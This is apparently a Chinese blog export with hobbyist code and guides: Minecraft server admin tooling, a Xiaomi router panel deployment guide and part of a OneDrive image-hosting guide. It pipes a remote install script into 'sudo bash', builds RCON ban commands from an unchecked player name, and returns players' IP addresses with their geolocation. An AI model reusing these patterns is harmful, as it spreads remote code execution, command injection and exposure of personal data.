默认折叠list.js123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202const scoreboardUrl = &#x27;https://***************/user/scoreboard&#x27;;const scoreboardBodyPickaxe = document.getElementById(&#x27;scoreboard-body-pickaxe&#x27;);const scoreboardBodyKills = document.getElementById(&#x27;scoreboard-body-kills&#x27;);const scoreboardBodyFish = document.getElementById(&#x27;scoreboard-body-fish&#x27;);const scoreboardBodyGametime = document.getElementById(&#x27;scoreboard-body-gametime&#x27;);const scoreboardBodyxp = document.getElementById(&#x27;scoreboard-body-xp&#x27;);fetch(scoreboardUrl) .then(response =&gt; response.json()) .then(scoreboard =&gt; &#123; //定义一个比较函数，按照pickaxe_total的大小从高到低排序 function compareByPickaxe(a, b) &#123; return b.pickaxe_total - a.pickaxe_total; &#125; //定义一个比较函数，按照Kills的大小从高到低排序 function compareByKills(a, b) &#123; return b.Kills - a.Kills; &#125; //定义一个比较函数，按照fish的大小从高到低排序 function compareByFish(a, b) &#123; return b.fish - a.fish; &#125; //定义一个比较函数，按照gametime的大小从高到低排序 function compareByGametime(a, b) &#123; return b.gametime - a.gametime; &#125; //定义一个比较函数，按照xp的大小从高到低排序 function compareByxp(a, b) &#123; return b.xp - a.xp; &#125; //定义一个过滤函数，排除掉pickaxe_total为0的玩家 function filterByPickaxe(a) &#123; return a.pickaxe_total &gt; 0; &#125; //定义一个过滤函数，排除掉Kills为null的玩家 function filterByKills(a) &#123; return a.Kills != null; &#125; //定义一个过滤函数，排除掉fish为null的玩家 function filterByFish(a) &#123; return a.fish != null; &#125; //定义一个过滤函数，排除掉gametime为null的玩家 function filterByGametime(a) &#123; return a.gametime != null; &#125; //定义一个过滤函数，排除掉xp为null的玩家 function filterByxp(a) &#123; return a.xp != null; &#125; //对scoreboard数组进行过滤 scoreboard = scoreboard.filter(filterByPickaxe); // 参照最初版重写！！！！ //创建一个副本数组，按照pickaxe_total排序 let scoreboardByPickaxe = [...scoreboard]; scoreboardByPickaxe.sort(compareByPickaxe); console.log(scoreboardByPickaxe) //创建一个副本数组，按照Kills排序，并过滤掉null值 let scoreboardByKills = [...scoreboard]; scoreboardByKills.sort(compareByKills); scoreboardByKills = scoreboardByKills.filter(filterByKills); //创建一个副本数组，按照fish排序，并过滤掉null值 let scoreboardByFish = [...scoreboard]; scoreboardByFish.sort(compareByFish); scoreboardByFish = scoreboardByFish.filter(filterByFish); //创建一个副本数组，按照gametime排序，并过滤掉null值 let scoreboardByGametime = [...scoreboard]; scoreboardByGametime.sort(compareByGametime); scoreboardByGametime = scoreboardByGametime.filter(filterByGametime); //创建一个副本数组，按照xp排序，并过滤掉null值 let scoreboardByXp = [...scoreboard]; scoreboardByXp.sort(compareByxp); scoreboardByXp = scoreboardByXp.filter(filterByxp); //遍历按照pickaxe_total排序的数组，创建表格行和单元格，并添加到对应的表格中 scoreboardByPickaxe.forEach((player, index) =&gt; &#123; const row = document.createElement(&#x27;tr&#x27;); const rank = document.createElement(&#x27;td&#x27;); const playerName = document.createElement(&#x27;td&#x27;); const pickaxeTotal = document.createElement(&#x27;td&#x27;); rank.textContent = index + 1; playerName.textContent = player.playername; pickaxeTotal.textContent = player.pickaxe_total; row.appendChild(rank); row.appendChild(playerName); row.appendChild(pickaxeTotal); scoreboardBodyPickaxe.appendChild(row); &#125;); //遍历按照Kills排序的数组，创建表格行和单元格，并添加到对应的表格中 scoreboardByKills.forEach((player, index) =&gt; &#123; const row = document.createElement(&#x27;tr&#x27;); const rank = document.createElement(&#x27;td&#x27;); const playerName = document.createElement(&#x27;td&#x27;); const kills = document.createElement(&#x27;td&#x27;); rank.textContent = index + 1; playerName.textContent = player.playername; kills.textContent = player.Kills; row.appendChild(rank); row.appendChild(playerName); row.appendChild(kills); scoreboardBodyKills.appendChild(row); &#125;); //遍历按照fish排序的数组，创建表格行和单元格，并添加到对应的表格中 scoreboardByFish.forEach((player, index) =&gt; &#123; const row = document.createElement(&#x27;tr&#x27;); const rank = document.createElement(&#x27;td&#x27;); const playerName = document.createElement(&#x27;td&#x27;); const fish = document.createElement(&#x27;td&#x27;); rank.textContent = index + 1; playerName.textContent = player.playername; fish.textContent = player.fish; row.appendChild(rank); row.appendChild(playerName); row.appendChild(fish); scoreboardBodyFish.appendChild(row); &#125;); //遍历按照gametime排序的数组，创建表格行和单元格，并添加到对应的表格中 scoreboardByGametime.forEach((player, index) =&gt; &#123; const row = document.createElement(&#x27;tr&#x27;); const rank = document.createElement(&#x27;td&#x27;); const playerName = document.createElement(&#x27;td&#x27;); const gametime = document.createElement(&#x27;td&#x27;); rank.textContent = index + 1; playerName.textContent = player.playername; gametime.textContent = Math.floor(player.gametime / 60 / 60) + &quot;h&quot;; row.appendChild(rank); row.appendChild(playerName); row.appendChild(gametime); scoreboardBodyGametime.appendChild(row); &#125;); //遍历按照xp排序的数组，创建表格行和单元格，并添加到对应的表格中 scoreboardByXp.forEach((player, index) =&gt; &#123; const row = document.createElement(&#x27;tr&#x27;); const rank = document.createElement(&#x27;td&#x27;); const playerName = document.createElement(&#x27;td&#x27;); const xp = document.createElement(&#x27;td&#x27;); rank.textContent = index + 1; playerName.textContent = player.playername; xp.textContent = getLevel(player.xp); row.appendChild(rank); row.appendChild(playerName); row.appendChild(xp); scoreboardBodyxp.appendChild(row); &#125;); &#125;);// 定义一个函数，参数为原始经验值function getLevel(exp) &#123; // 定义一个变量，存储经验等级 let level = 0; // 定义一个变量，存储升级所需的经验值 let expToNext = 0; // 使用循环，不断更新经验等级和升级所需的经验值，直到原始经验值不足以升级为止 while (true) &#123; // 根据公式，计算升级所需的经验值 if (level &lt;= 15) &#123; expToNext = 2 * level + 7; &#125; else if (level &lt;= 30) &#123; expToNext = 5 * level - 38; &#125; else &#123; expToNext = 9 * level - 158; &#125; // 判断原始经验值是否足够升级 if (exp &gt;= expToNext) &#123; // 如果足够，减去升级所需的经验值，增加经验等级 exp -= expToNext; level++; &#125; else &#123; // 如果不足，跳出循环 break; &#125; &#125; // 返回经验等级 return level;&#125; 管理： 如果内建账号密码登录，要增加一些工作量，所以我借鉴了一下之前某个AIGC平台的做法，向qq机器人发信息以获取有效期一周的token用于登录，这样安全性大大提高，而且写起来也不用顾虑太多。在初次打开时网页会发送鉴权请求判断是否有效，后续请求也都带上这个token。以下是部分代码片段 封禁玩家12345678910111213141516@app.route(&#x27;/admin/banplayer&#x27;, methods=[&#x27;POST&#x27;])def banplayer(): playername = request.json.get(&#x27;playername&#x27;) reason = request.json.get(&#x27;reason&#x27;)\t... if reason == &quot;&quot;: reason = &quot;未记录原因的封禁，请联系管理员&quot; command = &#x27;kick &#x27; + playername + &#x27; &#x27; + reason response = extra.sendcommand(command) command = &#x27;ban &#x27; + playername + &#x27; &#x27; + reason response = extra.sendcommand(command) conn = mysql.connector.connect(**DATABASE)\t... return jsonify(&#123;&#x27;code&#x27;:0,&#x27;response&#x27;: response&#125;), 200 extra.py1234567891011import mcrcon# 主机 密码 端口client = mcrcon.MCRcon(&#x27;127.0.0.1&#x27;, &#x27;*-*-*-*&#x27;, 2****5)client.connect()def sendcommand(command): if not command: return &#123;&#x27;error&#x27;: &#x27;No command provided&#x27;&#125; response = client.command(command) return response 解除封禁123456789@app.route(&#x27;/admin/debanplayer&#x27;, methods=[&#x27;POST&#x27;])def debanplayer(): playername = request.json.get(&#x27;playername&#x27;)\t... command = &#x27;pardon &#x27; + playername response = extra.sendcommand(command) conn = mysql.connector.connect(**DATABASE)\t... return jsonify(&#123;&#x27;code&#x27;:0,&#x27;response&#x27;: response&#125;), 200 获取用户信息12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849import ipdb@app.route(&#x27;/admin/getaccount&#x27;, methods=[&#x27;POST&#x27;])def getaccount(): accountinfo = request.json.get(&#x27;accountinfo&#x27;) mode = int(request.json.get(&#x27;mode&#x27;))\t... conn = mysql.connector.connect(**DATABASE) c = conn.cursor() if mode == 1: c.execute(&quot;SELECT * FROM `qq_user` where qq_id = %s&quot;, (accountinfo,)) elif mode == 2: c.execute(&quot;SELECT * FROM `qq_user` where user_name = %s&quot;, (accountinfo,)) elif mode == 3: c.execute(&quot;SELECT * FROM `qq_user` where be_name = %s&quot;, (accountinfo,)) else: c.execute(&quot;SELECT * FROM `qq_user` where qq_id = %s&quot;, (accountinfo,)) acc_result = c.fetchall() if acc_result: if acc_result[0][5] is None: be_name = &quot;!未绑定!&quot; else: be_name = acc_result[0][5] playername = acc_result[0][1] # 用的MySQL数据库，Authme和该服务共用一个数据库，因此直接调用其获取IP c.execute(&quot;SELECT * FROM `authme` where realname = %s or username = %s&quot;, (playername,playername,)) ip_result = c.fetchall() conn.close() #嵌套有点多，整活部分可以改掉 if ip_result: ip = ip_result[0][4] if ipaddress.ip_address(ip).is_private: ip = &quot;内网地址&quot; country=&quot;南极洲&quot; city=&quot;中山站&quot; else: ipinfo=db.find_map(ip, &quot;CN&quot;) country=ipinfo[&quot;country_name&quot;] city= ipinfo[&quot;region_name&quot;]+&quot;，&quot;+ipinfo[&quot;city_name&quot;] else: ip = &quot;!未记录在数据库!&quot; country=&quot;北极点&quot; city=&quot;鹦鹉螺号&quot; return jsonify(&#123;&#x27;code&#x27;:0,&#x27;qq&#x27;: acc_result[0][0],&#x27;user_name&#x27;: playername,&#x27;bind_time&#x27;: acc_result[0][2],&#x27;group&#x27;: acc_result[0][3],&#x27;status&#x27;: acc_result[0][4],&#x27;be_name&#x27;: be_name,&#x27;ip&#x27;: ip,&#x27;country&#x27;:country,&#x27;city&#x27;:city&#125;), 200 else: conn.close() return jsonify(&#123;&#x27;code&#x27;:1000,&#x27;msg&#x27;: &#x27;没有相应玩家消息&#x27;&#125;), 200 QQ-BOT 在整个规划中，它承担了相当重要的责任，譬如自动添加白名单（绑定） **绑定：**一开始我使用了一个极为简单的绑定方式：通过Rcon连接到服务器执行 whitelist add playername，按理来说这没问题，但是后面来的玩家基本都在抱怨进不去服务器。错误截图都一样，不在白名单内。最后发现uuid不一致，有些人的离线用户名与某些正版用户名重复了，导致服务端直接沿用正版用户的uuid，过不去后续校验。所以我这里就直接计算离线用户的uuid写入到whitelist.json内 mchelper\\__init__.py12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152@bind.handle()async def handle_first_receive(matcher: Matcher, args: Message = CommandArg()): plain_text = args.extract_plain_text() # 首次发送命令时跟随的参数，例：/绑定 username，则args为username if plain_text: matcher.set_arg(&quot;username&quot;, args) # 如果用户发送了参数则直接赋值@bind.got(&quot;username&quot;, prompt=&quot;请输入你的用户名&quot;)async def handle_username(event: GroupMessageEvent, username: Message = Arg(), username_str: str = ArgPlainText(&quot;username&quot;)): username = str(username) user_id = event.user_id pattern = r&#x27;^[a-zA-Z0-9_]+$&#x27; if re.match(pattern, username): pass else: extra.settimeout() await bind.finish(f&quot;用户名只可以包括英文字母，数字，下划线&quot;)\t... binduser(username)\t... await bind.finish(f&quot;&#123;username&#125; 绑定成功（若仍无法进入服务器，可尝试发送“正常流程绑定”）&quot;) # 即用whitelist add def binduser(playername): offline_uuid = str(extra.touuid(playername)) #offline_uuid = offline_uuid_raw[:8] + &quot;-&quot; + offline_uuid_raw[8:12] + &quot;-&quot; + offline_uuid_raw[12:16] + &quot;-&quot; + offline_uuid_raw[16:20] + &quot;-&quot; + offline_uuid_raw[20:] #读取 ***\\whitelist.json,找到playername对应的uuid，用offline_uuid替换 whitelist_file_path = r&quot;Z:\\server\\whitelist.json&quot; with open(whitelist_file_path, &quot;r&quot;, encoding=&quot;utf-8&quot;) as f: data = json.load(f) # 先尝试是否能找到对应玩家名称的条目，并替换uuid字段，如果没有，则新增 found = False # 定义一个变量，用来标记是否找到了对应的玩家条目 for player in data: if player[&quot;name&quot;] == playername: player[&quot;uuid&quot;] = offline_uuid # 替换uuid字段 found = True # 将变量设为True，表示找到了对应的玩家条目 break # 跳出循环，不再继续查找 if not found: # 如果变量为False，表示没有找到对应的玩家条目 data.append(&#123;&quot;name&quot;: playername, &quot;uuid&quot;: offline_uuid&#125;) # 在data列表中添加一个新的字典，包含玩家的名字和uuid # 将修改后的内容写回whitelist.json文件 with open(whitelist_file_path, &quot;w&quot;, encoding=&quot;utf-8&quot;) as f: json.dump(data, f) # 调用外部命令来重载白名单 client.connect() command = &quot;whitelist reload&quot; response = client.command(command) client.disconnect() mchelper\\extra.py12345678910111213141516171819import hashlibimport uuid#该函数用于计算离线用户的uuiddef touuid(name): name = &quot;OfflinePlayer:&quot; + name md5 = hashlib.md5() md5.update(name.encode(&#x27;utf-8&#x27;)) md5_bytes = md5.digest() md5_bytes = bytearray(md5_bytes) md5_bytes[6] &amp;= 0x0f md5_bytes[6] |= 0x30 md5_bytes[8] &amp;= 0x3f md5_bytes[8] |= 0x80 return uuid.UUID(bytes=bytes(md5_bytes)) **解绑：**其实差不了多少 mchelper\\__init__.py123456789101112131415161718def debinduser(playername): offline_uuid = str(extra.touuid(playername)) whitelist_file_path = r&quot;Z:\\server\\whitelist.json&quot; with open(whitelist_file_path, &quot;r&quot;, encoding=&quot;utf-8&quot;) as f: data = json.load(f) for player in data: if player[&quot;name&quot;] == playername: data.remove(player) # 移除该条目 # 将修改后的内容写回whitelist.json文件 with open(whitelist_file_path, &quot;w&quot;, encoding=&quot;utf-8&quot;) as f: json.dump(data, f) # 调用外部命令来重载白名单 client.connect() command = &quot;whitelist reload&quot; response = client.command(command) client.disconnect() 图片上传： flowchart LR A[User] -->|\"@BOT+图片\"| B[\"nb2-mchelper\"] B |\"upgit\"| C(\"pic.hzchu.top(lysk pro)\") B --> D[\"MySQL\"] mchelper\\__init__.py1234567891011121314151617181920212223242526272829303132333435363738394041424344upphoto = on_message(rule=to_me(), priority=5, block=True)@upphoto.handle()async def handle_upphoto(bot: Bot, event: GroupMessageEvent, state: T_State): user_id = event.user_id message = str(event.get_message()) conn = mysql.connector.connect(**DATABASE) # print(message) if message: if matches: pattern = r&quot;\\[CQ:image,file=\\w+\\.image,subType=\\d+,url=(https?://\\S+?)]&quot; matches = re.findall(pattern, message) current_time = time.strftime(&quot;%Y-%m-%d %H:%M:%S&quot;, time.localtime(time.time())) # print(matches) for match in matches: # print(match) file_name = str(user_id) + str(time.time() * 1000)+&quot;.jpg&quot; save_path = &#x27;./tmp/&#x27; + file_name response = requests.get(match, stream=True) if response.status_code == 200: with open(save_path, &#x27;wb&#x27;) as file: for chunk in response.iter_content(1024): file.write(chunk) path = &quot;Z:\\ b2\\\\mc\\\\tmp\\\\&quot; + file_name response = extra.upload_image(path) if response.startswith(&quot;https://&quot;): url = response c = conn.cursor() c.execute(&quot;INSERT INTO photo VALUES (%s,%s,%s,%s,%s)&quot;, (None, str(event.sender.card),user_id, current_time, url)) conn.commit() else: conn.disconnect() await upphoto.finish(&quot;上传失败（调用上传工具错误）&quot;) os.remove(path) else: conn.disconnect() await upphoto.finish(&quot;上传失败(请求图片错误)&quot;) conn.disconnect() await upphoto.finish(&quot;上传成功&quot;) else: conn.disconnect() return # 没有图片链接，不执行回复操作 聊天记录同步： send\\__init__.py123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778from nonebot import on_message, loggerfrom nonebot.adapters.onebot.v11 import GroupMessageEvent, Bot,MessageSegmentfrom nonebot.rule import startswithfrom nonebot import get_driverimport mcrconimport threadingimport timeimport remsg_matcher = on_message(priority=10, block=False)client = mcrcon.MCRcon(&#x27;127.0.0.1&#x27;, &#x27;******&#x27;, 2***5)def sendcommand(command): response = client.command(command) return response@msg_matcher.handle()async def _(bot: Bot, event: GroupMessageEvent): if event.group_id == 790118052: nick = str(event.sender.card) if nick == &quot;&quot;: nick = str(event.sender.nickname) msg = nick+&quot;:&quot;+replace(event.message) qqqq = &quot;[Q群]&quot; msg =f&#x27;[&#123;&#123;&quot;text&quot;:&quot;&#123;qqqq&#125;&quot;,&quot;color&quot;:&quot;gold&quot;&#125;&#125;,&#123;&#123;&quot;text&quot;:&quot;&#123;msg&#125;&quot;,&quot;color&quot;:&quot;white&quot;&#125;&#125;]&#x27; command=f&quot;tellraw @a [&#123;msg&#125;]&quot; # print(command) sendcommand(command)# 定义一个函数，接受一个文本参数，返回替换后的文本def replace(text): text = str(text) image_pattern = r&quot;\\[CQ:image,file=.+?image,subType=0,url=.+?\\]&quot; at_pattern = r&quot;\\[CQ:at,qq=\\d+\\]&quot; picface_pattern = r&quot;\\[CQ:image,file=.+?image,subType=1,url=.+?\\]&quot; face_pattern = r&quot;\\[CQ:face,id=.+?]&quot; record_pattern = r&quot;\\[CQ:record,file=.+?amr,url=.+?\\]&quot; redbag_pattern = r&quot;\\[CQ:redbag,title=.+?\\]&quot; shit_pattern = r&quot;请使用最新版手机QQ体验新功能&quot; result = re.sub(image_pattern, &quot;[图片]&quot;, text) result = re.sub(picface_pattern, &quot;[图片表情]&quot;, result) result = re.sub(face_pattern, &quot;[表情]&quot;, result) result = re.sub(at_pattern, &quot;@&quot;, result) result = re.sub(record_pattern, &quot;[语音]&quot;, result) result = re.sub(redbag_pattern, &quot;[红包]&quot;, result) result = re.sub(shit_pattern, &quot;不支持的信息类型&quot;, result) result = result.replace(&quot;&lt;&quot;, &quot;《&quot;).replace(&quot;&gt;&quot;, &quot;》&quot;) # 返回替换后的结果 return resultdef connectagain(): client.connect()def run_timer(): while True: # 每5分钟执行一次 time.sleep(5 * 60) # 在后台线程中执行需要定时执行的函数 threading.Thread(target=connectagain).start()# 避免重复执行使得后台刷屏connectagain()timer_thread = threading.Thread(target=run_timer)timer_thread.daemon = Truetimer_thread.start() 杂项 备份相关： 由于之前存档炸过一次，相关的备份措施也随之建立起来。可分为主动式和被动式。主动式嘛，好说，不就是手动关掉自动保存然后压缩到一个独立硬盘嘛 被动的话就是用Syncthing进行单向同步，目前，我设置了2台设备用于备份 flowchart LR A[Game Server] -->|\"有更改时同步\"| B(\"B Server\") A[Game Server] -->|\"2h全部同步\"| C C(\"A Server\")-->|\"有更改时同步\"|B 也用过git，但同步太耗性能了，遂放弃 自动节能 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980import subprocessimport psutilimport timefrom mcstatus import JavaServerimport redisBALANCE = &#x27;381b4222-f694-41f0-9685-ff5bb260df2e&#x27;HIGH_PERFORMANCE = &#x27;8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c&#x27;ENERGY_SAVER = &#x27;a1841308-3541-4fab-bc81-f71556f20b4a&#x27;redis_client = redis.Redis(host=&#x27;localhost&#x27;, port=6379, db=1)server = JavaServer.lookup(&quot;127.0.0.1:26565&quot;)people = 1def change_power_plan(plan): subprocess.run(f&#x27;powercfg /S &#123;plan&#125;&#x27;)def get_power_plan(): output = subprocess.run(&quot;powercfg /GETACTIVESCHEME&quot;, shell=True, stdout=subprocess.PIPE).stdout.decode(&quot;GBK&quot;) return output.split(&quot; &quot;)[-3]def what_power_plan(plan): if plan == BALANCE: return &quot;BALANCE&quot; elif plan == ENERGY_SAVER: return &quot;ENERGY_SAVER&quot; elif plan == HIGH_PERFORMANCE: return &quot;HIGH_PERFORMANCE&quot; else: return &quot;Unknown&quot;def what_power_planid(plan): if plan == &quot;BALANCE&quot;: return BALANCE elif plan == &quot;ENERGY_SAVER&quot;: return ENERGY_SAVER elif plan == &quot;HIGH_PERFORMANCE&quot;: return HIGH_PERFORMANCE else: return &quot;Unknown&quot;while True: current_time = time.strftime(&quot;%H:%M:%S&quot;, time.localtime()) plan = get_power_plan() mcserve_plan = redis_client.get(&#x27;powerplan&#x27;) if mcserve_plan is None: cpu_percent = psutil.cpu_percent() status = server.status() hour = int(current_time.split(&quot;:&quot;)[0]) if hour &gt;= 0 and hour &lt;= 5: if plan != ENERGY_SAVER: print(str(current_time) + &quot;：切换到节能模式&quot;) change_power_plan(ENERGY_SAVER) elif status.players.online &gt; 3: if plan != HIGH_PERFORMANCE: print(str(current_time) + &quot;：多人，切换到高性能模式&quot;) change_power_plan(HIGH_PERFORMANCE) elif status.players.online &gt; people: if plan != BALANCE: print(str(current_time) + &quot;：有人，切换到平衡模式&quot;) change_power_plan(BALANCE) elif cpu_percent &gt; 70: if plan != HIGH_PERFORMANCE: print(str(current_time) + &quot;：CPU占用过高，切换到平衡模式&quot;) change_power_plan(BALANCE) elif status.players.online &lt;= people: if plan != ENERGY_SAVER: print(str(current_time) + &quot;：无人，切换到节能模式&quot;) change_power_plan(ENERGY_SAVER) else: if plan != BALANCE: print(str(current_time) + &quot;：切换到平衡模式&quot;) change_power_plan(BALANCE) if mcserve_plan is not None: decoded_mcserve_plan = mcserve_plan.decode(&#x27;utf-8&#x27;) if what_power_plan(plan) == decoded_mcserve_plan: continue else: power_plan_id = what_power_planid(decoded_mcserve_plan) change_power_plan(power_plan_id) print(str(current_time) + &quot;：MCSERVE覆盖配置，切换到&quot; + decoded_mcserve_plan + &quot;计划&quot;) time.sleep(300) graph TB A[\"开始\"] B{\"获取mcserve_plan\"} C{\"mcserve_plan为空\"} D[\"获取当前时间、电源计划、CPU占用率和服务器状态\"] E{\"时间在0-5点\"} F{\"在线人数大于3\"} G{\"在线人数大于1\"} H{\"CPU占用率大于70%\"} I{\"在线人数小于等于1\"} J[\"切换到节能模式\"] K[\"切换到高性能模式\"] L[\"切换到平衡模式\"] M[\"切换到节能模式\"] N[\"切换到平衡模式\"] O{\"mcserve_plan不为空\"} Q[\"根据mcserve_plan切换电源计划\"] R[\"结束\"] A-->B B-->C C--是-->D D-->E E--是-->J E--否-->F F--是-->K F--否-->G G--是-->L G--否-->H H--\"是（后来临时修改）\"-->L H--否-->I I--是-->M I--否-->N C--否-->O O--是-->R O--否-->Q Q-->R 注：在部分情况下（如E5）使用高性能模式会使单核最高睿频下降，反而不利，可自行抉择 未开发完成功能 [WEB]小黑屋 ：在实行白名单后破坏性外挂直接绝迹，直接鸽了。 [WEB]假人管理：后来人也绝迹了，鸽 [WEB]成就：鸽 [WEB]自检 ：用于检查一开始结构图中各个部分的运行情况，后来发现都正常的很，遂鸽. [MCDR]实体追踪器：鸽 结语 ​\t逝去的事物，只是换了个形式陪伴在你我身边。 ​\t相册（多图预警） THEOSMANTHUSWINE()_1687446921569.9314.webpH_Skippy（原Yangyyx）()_1687447421090.0547.webpH_Skippy（原Yangyyx）()_1687447425470.0432.webpH_Skippy（原Yangyyx）()_1687447430099.4773.webpH_Skippy（原Yangyyx）()_1687447433416.5522.webpH_Skippy（原Yangyyx）()_1687447436391.867.webpH_Skippy（原Yangyyx）()_1687447439140.172.webpH_Skippy（原Yangyyx）()_1687447442236.669.webp2644.webp726.webp821.webp192.webp1228.webp5107.webp2917.webp8945.webp1045.webp9756.webp","tags":["python","MC"],"categories":["技术类"]},{"title":"Mirouterui简要部署指南","path":"/2023/howtorunmrui/","content":"前言 该项目是由于我厌倦了管理后台和APP的卡顿而写的，因此项目开发之初就不考虑集成在管理后台，做成一个独立的页面，并实现跨平台。 并且，调用的都是小米路由器独有的api接口，与Openwrt完全不兼容。 用于测试的只有r1d和r4a，对于别的型号的支持，还得看大家的反馈才能完善。 感谢YSC6666，黑衣剑士z，Super丶聪(@bilibili)的帮助 代码开源在 https://github.com/Mirouterui/ ，欢迎 star&amp;提prヾ(≧▽≦*)o 碍于实际需求，拿一台瘦客户机装了个ikuai，这个项目先鸽了 面板展示 首页路由器详情设备列表设备详情温度显示（仅支持部分设备）历史数据统计 部署 小米路由器是基于Openwrt的，故下文Openwrt仅指小米路由器 附： ​ WindowsOpenwrtDocker从Release下载对应的架构的发行版 64位：amd64，32位：i386，arm: arm 可访问镜像站以获取更快的速度 然后运行，程序会自动下载配置文件，在其中填上密码即可。配置文件中其它条目在下面 再次运行，等待下载页面静态文件，若能支持获取token即为成功 部分设备出现无法运行&amp;无法找到配置文件可使用“不使用upx压缩”版本（即带_noupx后缀的版本） 从Release复制对应的架构的发行版的下载链接 使用uname –a查看架构（如果为armv7l，考虑使用armv5版本） 运行： curl –L yourlink –o mirouterui chmod 777 mirouterui ./mirouterui 程序会自动下载配置文件，在其中填上密码即可。配置文件中其它条目在下面。. 再次运行，等待下载页面静态文件 若能支持获取token即为成功 常见问题： 无法下载配置文件，路由器太老了 使用 curl https://mruiapi.hzchu.top/downloadconfig -o config.json 手动下载 无法下载静态文件 从Mirouterui/static: 前端静态文件 (github.com)下载，并解压到static目录 命令： docker run -d -p 6789:6789 -v $(pwd):/app/data --name mirouter-ui --restart=always thun888/mirouter-ui 新建一个文件夹，并在该文件夹里运行上述命令，程序会在该文件夹里生成配置文件，修改即可 修改完成后重启该容器（或等待自动重启） 最后命令窗口中会显示网页的访问端口，使用设备的ip地址+端口号(6789)访问面板 常见问题 密码正确，但无法登陆：尝试获取自己路由器的key，可参考视频或使用自动工具 CPU占用为0： 受api限制，新版路由器无法正常获取，可尝试将其部署在路由器上 温度显示： 目前API模式只支持R1D,R2D,命令模式只支持红米AX6和R1D 设备显示不全： 当设备过多时，首页只会显示当前有网络活动的设备，请进入设备详细列表查看 在线前端无法使用： 受浏览器安全限制，需关闭访问私有ip限制 配置项 配置名 默认值 解释 dev [] 路由器信息，参阅dev项 history [] 历史记录相关功能，参阅history项 tiny false 启用后，不再下载静态文件，需搭配在线前端使用 netdata_routerid 0 调用netdata api时返回的路由器（对应dev项中第n个） flushTokenTime 1800 刷新token时间间隔(s) port 6789 网页页面端口号 debug true debug模式，建议在测试正常后关闭 dev项： 配置名 默认值 解释 password 路由器管理后台密码 key a2ffa5c9be07488bbb04a3a47d3c5f6a 路由器管理后台key ip 192.168.31.1 路由器IP routerunit false 启用后，程序通过gopsutil库获取CPU占用 history项： 配置名 默认值 解释 enable false 是否启用历史数据统计 sampletime 300 采样时间间隔(s) maxsaved 8640 最多记录条数 命令行参数： 参数 解释 –config 配置文件路径，默认为“./config.json” –basedirectory 基础目录路径，在里面存放静态文件 –databasepath 数据库路径，默认为“./database.db” 后台运行 注册为系统服务 1sudo vim /etc/systemd/system/mrui.service 12345678910[Unit]Description=mruiAfter=network.target network-online.targetRequires=network-online.target[Service]ExecStart=/pathto/mrui[Install]WantedBy=multi-user.target 设置开机自启 1sudo systemctl enable mrui 管理 1234查看状态：systemctl status mrui启动：sudo systemctl start mrui停止：sudo systemctl stop mrui重启：sudo systemctl restart mrui windows守护进程工具–nssm详解 - 博客园 (cnblogs.com) TODO [x] 历史数据统计 [x] 深色模式 [x] 多路由支持 [x] 快捷更新 [ ] 设备小工具 [x] netdata，api形式兼容 MRUI开发规划 主要功能已完成开发,接下来随缘更新😶‍🌫️ 更新日志 Stars~ 感谢各位😘 1-100","tags":["Mirouterui"]},{"title":"基于Onedrive的高可用性图床","path":"/2023/photoononedrive/","content":"前言 重写中。。。 一直以来，我都在尝试各种图片存储方案，一开始便是经典的Github+jsd，但考虑到违反了tos后面就用了cf+b2，但速度不尽人意。后来用了vercel反代gh和一些杂七杂八的，但换汤不换药嘛，还是不靠谱。 在差不多一年前，我在捣鼓网心云时想到个主意：何不用家里电脑作为图片存储，通过非标准端口访问绕过备案要求。于是在随记上提出个简易pcdn的想法 不过像我这种小站没必要搞那么重量级了，于是改进了下 思路 首先，本质上是个缓存服务，存储在OneDrive（下文简称od），通过各个节点分发图片，就是给od套了个CDN嘛。 因为我这网站也没多少流量，并发不高，我更倾向葫芦娃救爷爷式的单节点当主力，挂了再切换到其它节点的方式。 最后就是轻量，加上安全性问题总不能把od下放到每个节点吧。 故： 设立一个“主服务器”，用来将od的内容分发到节点，可以用无服务器函数，也可以直接和”图床服务器“合并。同时因为服务器间同步有延时，在”图床服务器“要留个口直接下载刚刚上传的图片。 设立一个”副服务器“，负责检测节点状况和跳转到对应节点。 ”图床服务器“：使用lsky-pro作为图床程序，将od使用rclone挂载到对应的存储策略文件夹上。 节点：获取访问的链接，检查本地有无缓存，有就返回，没有就下载再返回。考虑到要用php的话配置起来麻烦，直接用py了。 准备 服务器 &gt;=1台，最好是访问速度快的 一个微软账户（我这里用的是E5订阅账户） 有公网IP的家庭宽带（可选） 在od中新建/share/mount目录，若自行更改请注意将下文涉及的地方一起修改 推荐使用Linux，如果使用Windows下文操作将有所不同，需自行更改 安装（图床服务器） 首先完成“图床服务器”的搭建。 前置 libfuse 安装meson ninja 1pip3 install meson ninja 安装pip的三种方法 从 https://github.com/libfuse/libfuse/releases 下载libfuse的源码 解压，创建一个（临时）构建目录，然后 运行meson 123tar xzf fuse-3.15.1.tar.gz; cd fuse-3.15.1/mkdir build; cd buildmeson setup .. 3.15.1 替换为对应的releases版本 运行ninja进行安装 1sudo ninja install rclone 安装： 1curl https://rclone.org/install.sh | sudo bash 同时在本地也要安装，用来获取token 在本地运行rclone config进行配置 把token复制出来备用（token包括两端的{}） 在服务端进行同样的操作，但在Edit advanced config中填y image-20230731182953894 image-20230731183101473 然后一路回车，在Already have a token - refresh?填n 然后按要求填写 会自动获取drive_id,drive_type，不要回车太快按过了 挂载试试吧 12mkdir mountrclone mount one:/share/mount/ ./mount/ 不出意外你能看见这个报错 打开报错涉及的文件，取消注释，保存 再试下，如果没报错就可以了 新建的mount文件夹在下文没有作用，建议删除~ 使用fusermount -qzu mount 卸载 LNMP 不用多说 配置 图床本体 我这里用的是Lsky Pro作为图床程序，其他大同小异 按照文档安装好后，新建一个本地存储策略，访问地址指向“副服务器”，并在后面加上/mount，存储路径根据自己的网站路径来，如/www/wwwroot/pic.hzchu.top/就填/www/wwwroot/pic.hzchu.top/storage/app/mount/ 记得更改&amp;新建相应目录 Rclone 